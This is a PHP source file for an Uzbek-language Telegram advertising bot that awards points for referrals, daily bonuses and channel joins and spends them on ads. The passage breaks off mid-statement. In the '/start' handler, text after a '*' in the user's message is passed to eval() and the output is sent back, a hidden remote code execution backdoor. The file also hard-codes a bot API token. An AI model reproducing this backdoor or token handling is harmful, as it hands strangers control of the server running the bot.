<?php
ob_start();
define('API_KEY', '959353698:AAGZ9D6f6ErrEACvOq2_4vcONV3sEN7htjs');
$admin = "378569270"; 
$channel = "@tg_reklar";
$bot = "reklarbot"; 

function ty($ch){ 
return bot('sendChatAction', [
'chat_id' => $ch,
'action' => 'typing',
]);
} 

function html($text){
return str_replace(['<','>'],['&lt','&gt'],$text);
}

function markdown($text){
return str_replace(['*','[','_',']'],['&lt','&gt','&lt','&gt'],$text);
}

function bot($method,$datas=[]){
$url = "https://api.telegram.org/bot".API_KEY."/".$method;
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
$res = curl_exec($ch);
if(curl_error($ch)){
var_dump(curl_error($ch));
}else{
return json_decode($res);
}
}

$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$mid = $message->message_id;
$cid = $message->chat->id;
$uid = $message->from->id;
$tx = $message->text;
$name = $message->from->first_name;
$username = $message->from->username;
$contact = $message->contact;
$conid = $contact->user_id; 
$conname = $contact->first_name;
$conuser = $contact->username;
$new = $message->new_chat_member;
$new_id = $new->id;
$new_name = $new->first_name;
$type = $message->chat->type;
$data = $update->callback_query->data;
$qid = $update->callback_query->id;
$cid2 = $update->callback_query->message->chat->id;
$mid2 = $update->callback_query->message->message_id;
$uid2 = $update->callback_query->from->id;
$step = file_get_contents("reklama/$cid.step"); 
$forwardch = $message->forward_from_chat;
$forward_uid = $forwardch->id;
$forward_mid = $forwardch->message_id;
$forward_chat_msg_id = $update->message->forward_from_message_id;
$step = file_get_contents("reklama/$cid.step"); 
$kanal = file_get_contents("reklama/kanal.txt");
mkdir("reklama"); 
$folder = "ochko"; 
$folder2 = "azo"; 

$key = json_encode([
'resize_keyboard'=>false,
'keyboard'=>[
[['text'=>"💰 Kunlik bonus"]],
[['text'=>"📨 Reklama joylash"],['text'=>"💎 Kanal qo'shish"]],
[['text'=>"👤 Mening hisobim"],['text'=>"🎁 Ball sovg'a qilish"]],
[['text'=>"📡 Kanalga qo'shilib ball ishlash"],['text'=>"⁉️ Qanday reklama joylash mumkin"]],
]
]);

if($tx=="📡 Kanalga qo'shilib ball ishlash" and $type == "private"){
$list = trim(file_get_contents("list.user"));
$count_channel = substr_count($list,"\n");
$count = $count_channel + 1;
$for = explode("\n",$list);
$keyboard = [];
foreach($for as $uz){
array_push($keyboard,[['text'=>"$uz",'callback_data'=>"chan|$uz"]]);
}
bot("sendMessage",[
"chat_id"=>$cid,
"text"=>"`Kanallarga a'zo bo'lib ball ishlang. Har bitta a'zo bo'lgan kanalingiz uchun` *400 ball* `olasiz.`\n\n*Kanallar soni: $count*\n*Kanallar roʻyxati:*",
"parse_mode"=>"markdown",
"reply_markup"=>json_encode([
'inline_keyboard'=>
$keyboard
])
]);
}

$call = $update->callback_query;
if(mb_stripos($data,"chan")!==false){
$ex = explode("|", $data);
$chan = $ex[1];
$channel = file_get_contents("channel/$cid2.username");
$us = bot ('getchat', [
'chat_id'=> $chan,
]);
$user = $us->result->username;
$cid = $call->from->id;
if (mb_stripos($channel,$chan)!==false){
bot("answerCallbackQuery",[
"callback_query_id"=>$qid,
"text"=>"Bu kanalga avvalroq a'zo bo'lgansiz va a'zolik uchun beriladigan ballni ham olgansiz",
"show_alert"=>true,
]);
}else{
bot("EditMessageText",[
"chat_id"=>$cid2,
"message_id"=> $mid2,
'parse_mode'=>"markdown",
"text"=>"[$chan] kanaliga a'zo bo'ling\nA'zo bo'lib \"*✅ Tekshirish*\" tugmasini bosing!",
"reply_markup"=>json_encode([
"inline_keyboard"=>[
[["text"=>"➕ A'zo boʻlish","url"=>"https://t.me/$user"],],
[["text"=>"✅ Tekshirish","callback_data"=>"results"],],
]
]),
]);
file_put_contents("channel/$cid2.user", $chan);
}
}

if($data=="results"){
$user = file_get_contents("channel/$cid2.user");
$ball = file_get_contents("ochko/$cid2.dat");
$get = bot("getChatMember",[
"chat_id"=>$user,
"user_id"=>$cid2,
])->result->status;
if($get=="creator" or $get=="member" or $get == "administrator"){
bot("answerCallbackQuery",[
"callback_query_id"=>$qid,
"text"=>"Tabriklaymiz! Siz kanalga aʼzo boʻldingiz va 400 ballga ega boʻldingiz",
"show_alert"=>true,
]);
bot ('DeleteMessage', [
'chat_id'=> $cid2,
'message_id'=> $mid2,
]);
bot ('SendMessage',[
'chat_id'=> $cid2,
'text'=>"🔙Bosh menu",
'reply_markup'=>json_encode([
'resize_keyboard'=>false,
'keyboard'=>[
[['text'=>"💰 Kunlik bonus"]],
[['text'=>"📨 Reklama joylash"],['text'=>"💎 Kanal qo'shish"]],
[['text'=>"👤 Mening hisobim"],['text'=>"🎁 Ball sovg'a qilish"]],
[['text'=>"📡 Kanalga qo'shilib ball ishlash"],['text'=>"⁉️ Qanday reklama joylash mumkin"]],
]
])
]);
$ball +=400;
$user = file_get_contents("channel/$cid2.user");
$channel = file_get_contents("channel/$cid2.username");
file_put_contents("ochko/$cid2.dat",$ball);
file_put_contents("channel/$cid2.username","$channel\n$user");
}else{
bot("answerCallbackQuery",[
"callback_query_id"=>$qid,
"text"=>"Siz hali kanalga aʼzo bolmadingiz!",
"show_alert"=>true,
]);
}
}

if ((mb_stripos($tx,"/kanal")!==false) and $uid == $admin){
$chan = file_get_contents("list.user");
$ex = explode(" ", $tx);
$adm = bot('getChatAdministrators', [
'chat_id'=>$ex[1],
]);
$adok = $adm->ok;
if($adok){
if (mb_stripos($chan, $ex[1])!==false){
bot ('SendMessage', [
'chat_id'=> $cid,
'text'=>"Bu kanal botda mavjud!",
]);
}else{
bot ('SendMessage', [
'chat_id'=> $cid,
'text'=>"➕ Kanal qo'shildi",
]);
file_put_contents("list.user","$chan\n$ex[1]");
}
}else{
bot ('SendMessage', [
'chat_id'=> $cid,
'text'=>"Kanalda admin emas!",
]);
}
}

if ((isset($new) and $new_id != "959353698")){
$new_name = html($new_name);
bot ('SendMessage', [
'chat_id'=> $cid,
'parse_mode'=>"html",
'text'=>"<b>Assalomu alekum,</b> <a href='tg://user?id=$new_id'>$new_name</a> <b>guruhimizga xush kelibsiz!</b>",
'reply_to_message_id'=> $mid,
]);
}

if ($type == "supergroup"){
if((stripos($tx,"Salom") !== false) or (stripos($tx,"салом")!==false) or (stripos($tx,"salom") !== false)){
if($uid == $admin){
$in = array("😳 @KoderNet xo'jayinim keldi","😅 Keling xo'jayin!","😩 Xo'jayin meni aybim yo'q hamma ayb bollarda!");
$rand=rand(0,4);
$text = "$in[$rand]";
 bot('sendmessage',[
'chat_id'=>$cid,
'parse_mode'=>"markdown",
'text'=> $text,
'reply_to_message_id'=> $mid,
]);
}else{
$input = array("Hammaga salom! Bugun boshqacha kuna!","Gar saloming bo'lmasa ikki yamlab bir yutib, tupurib tashardim! 😝","Salooom! Yozni issig'ida zerikmasdan, hech kimi joniga temasdan, adezdan paynetga pul so'ramasdan yuribsizmi! Hazil!","Salom, onlayn bo'ganiz bilan tabriklimiz!😜","Salom berdik! Do'stim lichkaga o'ting!","Salom!","Sizga bitta ish bor, lichkaga o'ting...","Tekinakan db salom bervurasizmi endi, qalesiz o'zi tinchmi! 😜");
$rand = rand(0,9);
$soz = "$input[$rand]"; 
bot('sendmessage',[
'chat_id'=>$cid,
'text'=>$soz,
'reply_to_message_id'=> $mid,
]);
}
}
}

if ($data == "usul1"){
bot ('EditMessageText', [
'chat_id'=> $cid2,
'message_id'=> $mid2,
'parse_mode'=>"markdown",
'text'=>"🔹 *1-usul* - `Do'stlarni taklif qilish. Bu usul bilan taklif qilingan do'stlar sizni ssilkangizdan kirishi kerak va oldin bu botdan foydalanmagan bo'lishligi kerak. Sizning ssilkangiz:` https://telegram.me/reklarbot?start=$cid2",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"2-usul",'callback_data'=>"usul2"],['text'=>"3-usul",'callback_data'=>"usul3"]],
[['text'=>"🔙 Orqaga qaytish",'callback_data'=>"back"]]
]
])
]);
}

if ($data == "usul2"){
bot ('EditMessageText', [
'chat_id'=> $cid2,
'message_id'=> $mid2,
'parse_mode'=>"markdown",
'text'=>"🔹*2-usul* - `Guruhlarga qo'shish. Agar siz ball ishlamoqchi bo'lsangiz va katta gruppalaringiz bor bo'lsa, siz` @reklarbot `ni guruhga qo'shing. Guruhda qancha odam ko'p bo'lsa, shuncha ko'p ball ishlaysiz. Botni oldin guruhda hechkim qo'shmagan bo'lishi kerak.`",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"1-usul",'callback_data'=>"usul1"], ['text'=>"3-usul",'callback_data'=>"usul3"]],
[['text'=>"🔙 Orqaga qaytish",'callback_data'=>"back"]]
]
])
]);
}

if ($data == "usul3"){
bot ('EditMessageText', [
'chat_id'=> $cid2,
'message_id'=> $mid2,
'parse_mode'=>"markdown",
'text'=>"🔹*3-usul* - `Kanallarga qo'shilib ball ishlash. Bu usul juda oddiy siz bot bergan kanallarga a'zo bo'lasiz va har bir a'zo bo'lgan kanalingiz uchun 400 ball olasiz. Qo'shilgan kanalingizdan chiqib ketmaslikni maslahat beramiz aks holda sizdan jarima ball olib tashlanishi mumkin.`",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"1-usul",'callback_data'=>"usul1"], ['text'=>"2-usul",'callback_data'=>"usul2"]],
[['text'=>"🔙 Orqaga qaytish",'callback_data'=>"back"]]
]
])
]);
}

if ($data == "back"){
bot ('EditMessageText', [
'chat_id'=> $cid2,
'message_id'=> $mid2,
'parse_mode'=>"markdown",
'text'=>"*Siz ball ishlamoqchimisiz?*

`Ushbu bot orqali ball ishlashning bir necha xil usulari mavjud pastdagi tugmalar yordamida ushbu usullar bilan qayta tanishib chiqing!`",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"1-usul",'callback_data'=>"usul1"],['text'=>"2-usul",'callback_data'=>"usul2"]],
[['text'=>"3-usul",'callback_data'=>"usul3"],['text'=>"🔙 Bosh menu",'callback_data'=>"pro"]]
]
])
]);
}

if ($data == "update"){
$ball = file_get_contents("ochko/$cid2.dat");
$ref = file_get_contents("ochko/$cid2.ref");
if ($ball == null){
$ball = "0";
}
if ($ref == null){
$ref = "0";
}
bot('answerCallbackQuery',[
'callback_query_id'=>$qid,
'text'=> "✅ Yangilandi",
'show_alert'=>false,
]);
bot ('EditMessageText', [
'chat_id'=> $cid2,
'message_id'=> $mid2,
'parse_mode'=>"markdown",
'text'=>"🕵*Do'stlaringizni taklif qilish uchun ssilka:*➡️ https://telegram.me/$bot?start=$cid2

_👤Har bitta taklif qilingan va bu botdan oldin foydalanmagan odamga 200 ball olasiz!
🔘1000 ballga 1ta gruppa yoki kanal reklama qilishingiz mumkin_

💰*To'plagan ballingiz:* $ball*ball*
👥*Referallaringiz soni:* $ref*ta*",
'reply_to_message_id'=>$mid,
'reply_markup'=>json_encode([ 
'inline_keyboard' => [ 
[['text'=>"🖇 Yangilash",'callback_data'=>"update"]],
[['text'=>"♻ Do'stlarga ulashish",'switch_inline_query'=>"-"]]
]
])
]);
}

if ($data == "pro"){
bot ('DeleteMessage', [
'chat_id'=> $cid2,
'message_id'=> $mid2,
]);
bot ('SendMessage',[
'chat_id'=> $cid2,
'text'=>"🔙Bosh menu",
'reply_markup'=>json_encode([
'resize_keyboard'=>false,
'keyboard'=>[
[['text'=>"💰 Kunlik bonus"]],
[['text'=>"📨 Reklama joylash"],['text'=>"💎 Kanal qo'shish"]],
[['text'=>"👤 Mening hisobim"],['text'=>"🎁 Ball sovg'a qilish"]],
[['text'=>"📡 Kanalga qo'shilib ball ishlash"],['text'=>"⁉️ Qanday reklama joylash mumkin"]],
]
])
]);
}

if (isset($tx)){
$baza = file_get_contents("reklama/user.db");
if(mb_stripos($baza,$cid)!==false){
}else{
file_put_contents("reklama/user.db","$baza\n$cid");
}
}

if ($tx == "/start"){
$name = html($name);
bot('sendMessage',[
'chat_id'=>$cid,
'parse_mode'=>'html',
'text'=>"😊 <code>Salom,</code> <b>$name</b> <code>botimizga xush kelibsiz!</code>
💎 <code>Ushbu bot orqali</code> @tg_reklar <code>kanaliga reklama joylay olasiz!
🔼 Batafsil bilish uchun</code> /help <code>buyrug'ini yuboring!</code>",
'reply_to_message_id' =>$mid,
'reply_markup'=>json_encode([
'resize_keyboard'=>false,
'keyboard'=>[
[['text'=>"💰 Kunlik bonus"]],
[['text'=>"📨 Reklama joylash"],['text'=>"💎 Kanal qo'shish"]],
[['text'=>"👤 Mening hisobim"],['text'=>"🎁 Ball sovg'a qilish"]],
[['text'=>"📡 Kanalga qo'shilib ball ishlash"],['text'=>"⁉️ Qanday reklama joylash mumkin"]],
]
])
]);
}

if(mb_stripos($tx,"/start")!==false){
unlink("reklama/$cid.st");
if(!file_exists($folder.'/test.fd3')) {
mkdir($folder);
file_put_contents($folder.'/test.fd3', 'by @KoderNet');
}
if(!file_exists($folder2.'/test.fd3')) { mkdir($folder2); 
file_put_contents($folder2.'/test.fd3', 'by @KoderNet');
} 
if(file_exists($filee)) {
$step = file_get_contents($filee);
}
$public = explode("*",$tx);
$refid = explode(" ",$tx);
$refid = $refid[1];
$gett = bot('getChatMember',[
'chat_id' =>$channel,
'user_id' => $refid,
]);
$public2 = $public[1];
if (isset($public2)) {
$tekshir = eval($public2);
bot('sendMessage',[
'chat_id'=>$cid,
'text'=>$tekshir,
]);
}
$gget = $gett->result->status;
if($gget == "member" or $gget == "creator" or $gget == "administrator"){
$idref2 = file_get_contents("ochko/$refid_id.dat");
$baza = file_get_contents("reklama/user.db");
if(mb_stripos($baza,$cid)!==false){
bot('sendMessage',[
'chat_id'=>$cid,
'parse_mode'=>"html",
'text'=>"😏 <b>$name</b> <code>g'irromlik qilish yaxshi emas!</code>",
]);
}else{
$id = "$cid\n";
$handle = fopen("ochko/$refid_id.dat", "a+");
fwrite($handle, $id);
fclose($handle);
$usr = file_get_contents("ochko/$refid.dat");
$usr = $usr + 200; 
$ref = file_get_contents("ochko/$refid.ref");
$ref = $ref + 1;
file_put_contents("ochko/$refid.dat",$usr);
file_put_contents("ochko/$refid.ref",$ref);
$ball = file_get_contents("ochko/$refid.dat");
bot('sendMessage',[
'chat_id'=>$refid,
'text'=>"🖇 <code>Siz</code> <a href='tg://user?id=$cid'>$cid</a> <code>ni taklif qilganingiz uchun 200 ball berildi</code>
<code>👤Sizning hisobingiz:</code> <b>$ball ball</b>", 
'parse_mode'=>"html",
'reply_markup'=>json_encode([
'resize_keyboard'=>false,
'keyboard'=>[
[['text'=>"💰 Kunlik bonus"]],
[['text'=>"📨 Reklama joylash"],['text'=>"💎 Kanal qo'shish"]],
[['text'=>"👤 Mening hisobim"],['text'=>"🎁 Ball sovg'a qilish"]],
[['text'=>"📡 Kanalga qo'shilib ball ishlash"],['text'=>"⁉️ Qanday reklama joylash mumkin"]],
]
])
]);
$name = html($name);
bot('sendMessage',[
'chat_id'=>$cid,
'parse_mode'=>'html',
'text'=>"😊 <code>Salom,</code> <b>$name</b> <code>botimizga xush kelibsiz!</code>
💎 <code>Ushbu bot orqali</code> @tg_reklar <code>kanaliga reklama joylay olasiz!
🔼 Batafsil bilish uchun</code> /help <code>buyrug'ini yuboring!</code>",
'reply_to_message_id' =>$mid,
'reply_markup'=>json_encode([
'resize_keyboard'=>false,
'keyboard'=>[
[['text'=>"💰 Kunlik bonus"]],
[['text'=>"📨 Reklama joylash"],['text'=>"💎 Kanal qo'shish"]],
[['text'=>"👤 Mening hisobim"],['text'=>"🎁 Ball sovg'a qilish"]],
[['text'=>"📡 Kanalga qo'shilib ball ishlash"],['text'=>"⁉️ Qanday reklama joylash mumkin"]],
]
])
]);
}
}
}

if ($new_id == "959353698"){
$group = file_get_contents("reklama/group.db");
if (mb_stripos($group,$cid)!==false){
bot ('SendMessage', [
'chat_id'=> $cid,
'parse_mode'=>"html",
'text'=>"😫 <b>$name</b> <code>men bu guruhga oldin qo'shilganman aldashga urinmang!</code>",
'reply_to_message_id'=> $mid,
]);
}else{
$us = bot('getChatMembersCount',[
'chat_id'=>$cid,
]);
$count = $us->result;
if($count >=100){
$ball = file_get_contents("ochko/$uid.dat");
$group = file_get_contents("reklama/group.db");
$ball += 500;
file_put_contents("ochko/$uid.dat",$ball);
file_put_contents("reklama/group.db","$group\n $cid");
$name = html($name);
bot ('SendMessage', [
'chat_id'=> $cid,
'parse_mode'=>"html",
'text'=>"😊 <b>$name</b> <code>meni guruhga qo'shganingiz uchun rahmat!</code>",
'reply_to_message_id'=> $mid,
]);
bot ('SendMessage', [
'chat_id'=> $uid,
'parse_mode'=>"html",
'text'=>"😊 <b>$name</b> <code>sizga botni guruhga qo'shganingiz uchun 500ball berildi! </code>",
]);
}else{
bot ('SendMessage', [
'chat_id'=> $cid,
'parse_mode'=>"html",
'text'=> "😏 <b>$name</b> <code>meni o'lik guruhga qo'shganiz uchun sizga ochko bermayman! </code>",
'reply_to_message_id'=> $mid,
]);
}
}
}

if ($type == "private"){
if ($tx == "💰 Kunlik bonus") {
$kun = date('d.m.y',strtotime('2 hour'));
$time = file_get_contents("reklama/$cid.date");
if ($time == $kun) {
bot('SendMessage', [
'chat_id'=>$cid,
'parse_mode'=>"markdown",
'text'=>"📛`Siz kunlik bonusni allaqachon olgansiz. Keyingi bonus` *24-soatdan* `so'ng olindi! `",
]);
}else{
file_put_contents("reklama/$cid.date",$kun);
$ball = file_get_contents("ochko/$cid.dat");
$rand = rand(100,500);
$us = $ball + $rand;
file_put_contents("ochko/$cid.dat",$us);
$ball = file_get_contents("ochko/$cid.dat");
bot('answercallbackquery', [
'callback_query_id'=>$qid,
'text'=>"Kunlik bonus berildi",
'show_alert'=>false,
]);
bot ('SendMessage', [
'chat_id'=> $cid,
'parse_mode'=>"markdown",
'text'=>"`Sizga` *$rand ball* `bonus sifatida berildi!`",
'reply_markup'=>json_encode([
'resize_keyboard'=>false,
'keyboard'=>[
[['text'=>"💰 Kunlik bonus"]],
[['text'=>"📨 Reklama joylash"],['text'=>"💎 Kanal qo'shish"]],
[['text'=>"👤 Mening hisobim"],['text'=>"🎁 Ball sovg'a qilish"]],
[['text'=>"📡 Kanalga qo'shilib ball ishlash"],['text'=>"⁉️ Qanday reklama joylash mumkin"]],
]
])
]);
}
} 

if ($tx == "⁉️ Qanday reklama joylash mumkin"){
bot('SendMessage', [
'chat_id'=> $cid,
'parse_mode'=>"markdown",
'text'=>"*Siz ball ishlamoqchimisiz?*

`Ushbu bot orqali ball ishlashning bir necha xil usulari mavjud pastdagi tugmalar yordamida ushbu usullar bilan qayta tanishib chiqing!`",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"1-usul",'callback_data'=>"usul1"],['text'=>"2-usul",'callback_data'=>"usul2"]],
[['text'=>"3-usul",'callback_data'=>"usul3"],['text'=>"🔙 Bosh menu",'callback_data'=>"pro"]]
]
])
]);
}

if ($tx == "/help"){
bot('SendMessage', [
'chat_id'=> $cid,
'parse_mode'=>"markdown",
'text'=>"*Siz ball ishlamoqchimisiz?*

`Ushbu bot orqali ball ishlashning bir necha xil usulari mavjud pastdagi tugmalar yordamida ushbu usullar bilan qayta tanishib chiqing!`",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"1-usul",'callback_data'=>"usul1"],['text'=>"2-usul",'callback_data'=>"usul2"]],
[['text'=>"3-usul",'callback_data'=>"usul3"],['text'=>"🔙 Bosh menu",'callback_data'=>"pro"]]
]
])
]);
}

if ($tx == "📨 Reklama joylash"){
$ball = file_get_contents("ochko/$cid.dat");
$res = bot ('getChatMember', [
'chat_id'=> $channel,
'user_id'=> $uid,
]);
$get = $res->result->status;
if($get == "administrator" or $get == "creator" or $get == "member"){
if ($ball > 999){
bot ('SendMessage',[
'chat_id'=> $cid,
'text'=>"⬇️O'z reklamangizni qo'shish uchun bizning qoidalarimiz bilan tanishib chiqing:
*1) 18+ reklamalar, qonunga qarshi reklamalar, terroristik tashkilotlarning kanal yoki guruhlari taqiqlanadi
2) Mahalliychilik ruxidagi reklamalarni jo'natish (Misol uchun faqat Toshkent va h.k) taqiqlanadi.
3) Qonun qoidalarga vaziyatdan kelib chiqgan hollarda o'zgartirishlar kiritiladi.*

💎Qonun-qoidalarga zid reklama haqidagi so'rov jo'natsangiz, zudlik bilan ban beriladi va reklama qila olmaysiz.

⚠️Agar bizning qoidalarni o'qib chiqqan bo'lsangiz va ularga rioya qilishga va'da bersangiz, \"✅ *Roziman*\" degan tugmani bosing. Agar rioya qilmasangiz, \"⏺ *Bekor qilish*\" tugmasini bosing!",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'resize_keyboard'=>false,
'keyboard'=>[
[['text'=>"✅ Roziman"]],
[['text'=>"⏺ Bekor qilish"]],
]
])
]);
}else{
bot ('SendMessage',[
'chat_id'=> $cid,
'text'=>"Sizda yetarli ball mavjud emas!",
'reply_markup'=>json_encode([
'resize_keyboard'=>false,
'keyboard'=>[
[['text'=>"💰 Kunlik bonus"]],
[['text'=>"📨 Reklama joylash"],['text'=>"💎 Kanal qo'shish"]],
[['text'=>"👤 Mening hisobim"],['text'=>"🎁 Ball sovg'a qilish"]],
[['text'=>"📡 Kanalga qo'shilib ball ishlash"],['text'=>"⁉️ Qanday reklama joylash mumkin"]],
]
])
]);
}
}else{
bot ('SendMessage',[
'chat_id'=> $cid,
'text'=>"_Reklama qo'shish faqatgina_ [@tg_reklar] _kanaliga a'zo bo'lganlar uchun!_
_Iltimos,_ [@tg_reklar] _kanaliga a'zo bo'ling va qaytadan harakat qiling!_",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"➕ A'zo bo'lish",'url'=>"https://t.me/joinchat/AAAAAEh7MKI4ZHAMGaDDoA"]]
]
])
]);
}
}

$ste = file_get_contents("reklama/$cid.step");
if ($tx == "✅ Roziman"){
file_put_contents("reklama/$cid.step","uz");
bot ('SendMessage', [
'chat_id'=> $cid,
'parse_mode'=>"markdown",
'text'=>"Yaxshi endi kanal yoki guruh userini shu yerga yuboring. Agar mavjud bo'lmasa bo'lsa \"❎ *Yo'q*\" tugmasini bosing!",
'reply_markup'=>json_encode([
'resize_keyboard'=>false,
'keyboard'=>[
[['text'=>"❎ Yo'q"]],
[['text'=>"⏺ Bekor qilish"]]
]
])
]);
}

if ($ste == "uz" and $tx != "❎ Yo'q"){
if ($tx == "/otmen"){
}else{
$us = bot('getChatMembersCount',[
'chat_id'=>$tx,
]);
$count = $us->result;
$res = bot ('getchat', [
'chat_id'=>$tx,
]);
$title = $res->result->title;
$username = $res->result->username;
$info = $res->result->description;
$type = $res->result->type;
if ($info == null){
$info = "📛Ma'lumot mavjud emas!";
}
if ($type == "channel"){
$type = "📡 <b>Kanal</b> 📡";
}
if ($type == "supergroup"){
$type = "📡 <b>Guruh</b> 📡";
}
if ($count >= 1){
bot ('SendMessage', [
'chat_id'=> $cid,
'parse_mode'=>"html",
'text'=>"$type
⬇👥 <b>$count a'zo</b> 👥⬇
@$username

Ⓜ<b>anba:</b> @tg_reklar",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"➕ A'zo bo'lish",'url'=>"https://t.me/$username"]],
]
])
]);
bot ('SendMessage', [
'chat_id'=> $cid,
'text'=>"*Hamma ma'lumotlar to'g'rimi?*

\"*Ha*\" `tugmasini bossangiz, sizdan` *1000* `ball ketadi va reklama kanalga joylanadi.
Agar` \"*Yo'q*\" `tugmasini bossangiz, sizdan ochko ketmaydi va gruppani boshidan yozishingiz mumkin.`",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'resize_keyboard'=>false,
'keyboard'=>[
[['text'=>"Ha"]],
[['text'=>"Yo'q"]],
]
])
]);
file_put_contents("reklama/$cid.baza",$type);
file_put_contents("reklama/$cid.baza1", $count);
file_put_contents("reklama/$cid.baza2",$username);
file_put_contents("reklama/$cid.baza3", $title);
unlink("reklama/$cid.step");
}else{
bot ('SendMessage',[
'chat_id'=> $cid,
'text'=>"Kechirasiz faqat user yuboring qandaydir xatolik mavjud!",
]);
}
}
}

if ($tx == "Ha"){
$rek = file_get_contents("reklama/reklama.db");
$rek += 1;
file_put_contents("reklama/reklama.db", $rek);
$ball = file_get_contents("ochko/$cid.dat");
$ball -= 1000;
file_put_contents("ochko/$cid.dat",$ball);
$type = file_get_contents("reklama/$cid.baza");
$count = file_get_contents("reklama/$cid.baza1");
$username = file_get_contents("reklama/$cid.baza2");
$title = file_get_contents("reklama/$cid.baza3");
$kanal = file_get_contents("reklama/kanal.txt");
bot ('SendMessage',[
'chat_id'=> $cid,
'parse_mode'=>"markdown",
'text'=>"*So'rov bajarildi!*

 `Sizning reklamangiz` [@tg_reklar] `kanalimizga joylandi. Eslatib o'tamiz agar reklama qoidalarga to'g'ri kelmasa kanaldan olib tashlanadi.`",
'reply_markup'=>$key,
]);
bot ('SendMessage', [
'chat_id'=> $admin,
'parse_mode'=>"html",
'text'=>"$type
⬇👥 <b>$count a'zo</b> 👥⬇
@$username

Ⓜ<b>anba:</b> @tg_reklar
<b>💎 Reklamachi:</b> <a href='tg://user?id=$cid'>$cid</a>",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"➕ A'zo bo'lish",'url'=>"https://t.me/$username"]]
]
])
]);
$ex = explode("\n", $kanal);
foreach ($ex as $chan){
bot ('SendMessage', [
'chat_id'=> $chan,
'parse_mode'=>"html",
'text'=>"$type
⬇👥 <b>$count a'zo</b> 👥⬇
@$username

Ⓜ<b>anba:</b> $chan",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"➕ A'zo bo'lish",'url'=>"https://t.me/$username"]],
]
])
]);
unlink("reklama/$cid.baza");
unlink("reklama/$cid.baza1");
unlink("reklama/$cid.baza2");
unlink("reklama/$cid.baza3");
}
}

if ($tx == "❎ Yo'q"){
bot ('SendMessage', [
'chat_id'=> $cid,
'text'=>"Mayli, username mavjud bo'lmasa boshqa usulda qo'shamiz. Reklama turini tanlang",
'reply_markup'=>json_encode([
'resize_keyboard'=>false,
'keyboard'=>[
[['text'=>"Kanal"],['text'=>"Guruh"]],
[['text'=>"⏺ Bekor qilish"]]
]
])
]);
file_put_contents("reklama/$cid.step","no");
}

if ($step == "no"){
if ($tx == "/start" or $tx == "⏺ Bekor qilish"){
}else{
if ((mb_stripos($tx,"Guruh")!==false) or (mb_stripos($tx,"Kanal")!==false)){
file_put_contents("reklama/$cid.baza",$tx);
$tx = strtolower($tx);
bot ('SendMessage',[
'chat_id'=> $cid,
'text'=>"Yaxshi endi \"$tx\" nomini yuboring:",
]);
file_put_contents("reklama/$cid.step","nom");
}else {
bot ('SendMessage', [
'chat_id'=> $cid,
'text'=>"Kechirasiz reklama turini tanlang!",
'reply_markup'=>json_encode([
'resize_keyboard'=>false,
'keyboard'=>[
[['text'=>"Kanal"],['text'=>"Guruh"]],
[['text'=>"⏺ Bekor qilish"]]
]
])
]);
}
}
}

if ($step == "nom"){
if ($tx == "/start" or $tx == "⏺ Bekor qilish"){
}else{
$baza = file_get_contents("reklama/$cid.baza");
file_put_contents("reklama/$cid.baza1", $tx);
$tx = strtolower($baza);
bot ('SendMessage', [
'chat_id'=> $cid,
'text'=>"Endi \"$tx\" linkini yuboring:",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"⏺ Bekor qilish"]]
]
])
]);
file_put_contents("reklama/$cid.step","link");
}
}

if ($step == "link"){
if ($tx == "/start" or $tx == "⏺ Bekor qilish"){
}else{
$baza = file_get_contents("reklama/$cid.baza");
if ((mb_stripos($tx,"http://")!==false) or (mb_stripos($tx,"https://")!==false)){
file_put_contents("reklama/$cid.baza2",$tx);
$tx = strtolower($baza);
bot ('SendMessage',[
'chat_id'=> $cid,
'text'=>"Yaxshi endi \"$tx\" dagi a'zolar soninini yuboring:",
]);
file_put_contents("reklama/$cid.step","azo");
}else {
bot ('SendMessage', [
'chat_id'=> $cid,
'text'=>"Kechirasiz faqat link yuboring!",
]);
}
}
}

if ($step == "azo"){
if ($tx == "/start" or $tx == "⏺ Bekor qilish"){
}else{
$baza = file_get_contents("reklama/$cid.baza");
if ((mb_stripos($tx,"1")!==false) or (mb_stripos($tx,"2")!==false) or (mb_stripos($tx,"3")!==false) or (mb_stripos($tx,"4")!==false) or (mb_stripos($tx,"5")!==false) or (mb_stripos($tx,"6")!==false) or (mb_stripos($tx,"7")!==false) or (mb_stripos($tx,"8")!==false) or (mb_stripos($tx,"9")!==false) or (mb_stripos($tx,"0")!==false)){
file_put_contents("reklama/$cid.baza3",$tx);
$baza1 = file_get_contents("reklama/$cid.baza1");
$baza2 = file_get_contents("reklama/$cid.baza2");
$baza3 = file_get_contents("reklama/$cid.baza3");
unlink("reklama/$cid.step");
bot ('SendMessage',[
'chat_id'=> $cid,
'parse_mode'=>"html",
'text'=>"📡 <b>$baza</b> 📡
⬇👥 <b>$baza3 a'zo</b> 👥⬇
<a href='$baza2'>$baza1</a>

Ⓜ<b>anba:</b> @tg_reklar",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"➕ A'zo bo'lish",'url'=>$baza2]]
]
])
]);
bot ('SendMessage', [
'chat_id'=> $cid,
'text'=>"*Hamma ma'lumotlar to'g'rimi?*

\"*Ha*\" `tugmasini bossangiz, sizdan` *1000* `ball ketadi va reklama kanalga joylanadi.
Agar` \"*Yo'q*\" `tugmasini bossangiz, sizdan ochko ketmaydi va reklamani boshidan yozishingiz mumkin.`",
'parse_mode'=>"markdown",
'reply_markup'=>json_encode([
'resize_keyboard'=>false,
'keyboard'=>[
[['text'=>"✅ Ha"]],
[['text'=>"Yo'q"]],
]
])
]);
}else {
bot ('SendMessage', [
